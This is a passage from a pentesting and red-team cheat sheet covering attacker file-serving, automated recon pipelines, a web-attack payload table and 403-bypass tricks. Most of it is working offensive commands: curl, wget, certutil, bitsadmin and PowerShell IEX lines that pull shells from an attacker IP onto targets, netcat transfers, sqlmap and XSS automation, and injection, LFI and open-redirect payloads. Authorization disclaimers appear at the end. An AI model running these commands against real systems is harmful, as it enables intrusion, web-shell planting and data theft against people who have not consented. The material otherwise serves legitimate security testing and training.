unshare -a bash                            # Run in new namespace

# Note: In real engagements you should NOT destroy logs.
# Clearing logs is included here for awareness only.
# Professional red team engagements document every action.
```

---

## 15. Serving Files from Kali (Attacker Infrastructure)

```bash
# Python HTTP server (quickest)
python3 -m http.server 80
python3 -m http.server 8080

# Python HTTPS server
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
python3 -c "
import http.server, ssl
server = http.server.HTTPServer(('0.0.0.0', 443), http.server.SimpleHTTPRequestHandler)
server.socket = ssl.wrap_socket(server.socket, keyfile='key.pem', certfile='cert.pem')
server.serve_forever()
"

# Apache
service apache2 start
cp shell.php /var/www/html/

# Nginx
service nginx start

# FTP server (for Windows targets)
python3 -m pyftpdlib -p 21

# SMB server (for Windows targets)
impacket-smbserver share /tmp/files -smb2support
impacket-smbserver share /tmp/files -smb2support -username user -password pass

# PHP built-in server
php -S 0.0.0.0:8080 -t /var/www/html/

# Netcat file transfer
# Sender:   nc -lvnp 4444 < file
# Receiver: nc attacker_ip 4444 > file

# Upload to target (curl from target machine)
# Target runs: curl http://192.168.1.5/shell.php -o /tmp/shell.php
# Target runs: wget http://192.168.1.5/shell.php -O /var/www/html/shell.php

# Certutil (Windows target)
# certutil -urlcache -split -f http://192.168.1.5/shell.exe C:\Windows\Temp\shell.exe

# BITSAdmin (Windows target)
# bitsadmin /transfer job http://192.168.1.5/shell.exe C:\Temp\shell.exe

# PowerShell download (Windows target)
# IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.5/script.ps1')
# Invoke-WebRequest http://192.168.1.5/shell.exe -OutFile C:\Temp\shell.exe
```

---

## 16. Automated Scanning Pipelines

```bash
# Full recon → scan → vuln pipeline
TARGET="target.com"

# Step 1: Subdomain enum
subfinder -d $TARGET -o subs.txt
amass enum -d $TARGET >> subs.txt
sort -u subs.txt -o subs.txt

# Step 2: Live host check
httpx -l subs.txt -status-code -title -tech-detect -o live_hosts.txt
cat live_hosts.txt | awk '{print $1}' > live_urls.txt

# Step 3: Screenshot all live hosts
gowitness file -f live_urls.txt -P ./screenshots/

# Step 4: URL collection
cat live_urls.txt | gau >> all_urls.txt
cat live_urls.txt | waybackurls >> all_urls.txt
sort -u all_urls.txt -o all_urls.txt

# Step 5: Find URLs with parameters
grep "?" all_urls.txt > param_urls.txt

# Step 6: Nuclei scan
nuclei -l live_urls.txt -t cves/ -t vulnerabilities/ -t exposures/ \
       -severity critical,high -o nuclei_results.txt

# Step 7: SQLi testing
cat param_urls.txt | python3 gf.py sqli | sqlmap --stdin --batch --dbs

# Step 8: XSS testing
cat param_urls.txt | python3 gf.py xss | dalfox pipe

# Step 9: Directory brute force on all live hosts
while read url; do
  gobuster dir -u $url \
    -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
    -x php,html,txt,bak -t 30 -o "gobuster_$(echo $url | tr '/:' '_').txt"
done < live_urls.txt

echo "Recon complete. Results in current directory."
```

---

## Quick Reference — Web Attack Cheatsheet

| Vulnerability | Quick Test | Tool |
|--------------|------------|------|
| SQLi | Add `'` to param | sqlmap |
| XSS | `<script>alert(1)</script>` | dalfox, XSStrike |
| LFI | `?file=../../../../etc/passwd` | wfuzz, lfimap |
| SSRF | `?url=http://127.0.0.1/` | ssrfmap |
| XXE | XML with `<!ENTITY` | manual/Burp |
| SSTI | `{{7*7}}` in templates | tplmap |
| IDOR | Change ID in URL/body | Burp Intruder |
| CSRF | Remove token, resend | Burp PoC generator |
| Command injection | `; id` in inputs | commix |
| Open redirect | `?redirect=http://evil.com` | manual/ffuf |
| JWT | Decode, modify, alg:none | jwt_tool |

---

## HTTP Response Codes for Pentesters

| Code | Meaning | Pentest Notes |
|------|---------|---------------|
| 200 | OK | Content found |
| 301/302 | Redirect | Follow or test for open redirect |
| 400 | Bad Request | Possible WAF or input filter |
| 401 | Unauthorized | Auth required — brute force candidate |
| 403 | Forbidden | Check for bypass (methods, paths, headers) |
| 404 | Not Found | Can be faked by WAF |
| 405 | Method Not Allowed | Try other HTTP methods |
| 500 | Server Error | Possible code execution or SQLi |
| 502/503 | Bad Gateway | Backend service issue |

---

## 403 Bypass Techniques

```bash
# URL manipulation
/admin → /%2fadmin
/admin → /admin/
/admin → /ADMIN
/admin → /admin/.
/admin → //admin//

# Header bypass
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/admin
curl -H "X-Real-IP: 127.0.0.1" http://target.com/admin
curl -H "X-Custom-IP-Authorization: 127.0.0.1" http://target.com/admin
curl -H "X-Originating-IP: 127.0.0.1" http://target.com/admin
curl -H "X-Remote-IP: 127.0.0.1" http://target.com/admin

# Method override
curl -X TRACE http://target.com/admin
curl -X POST -H "X-HTTP-Method-Override: GET" http://target.com/admin
```

---

*Professional Web Server Penetration Testing & Red Teaming Reference*
*Always operate within legal boundaries with explicit written authorization.*
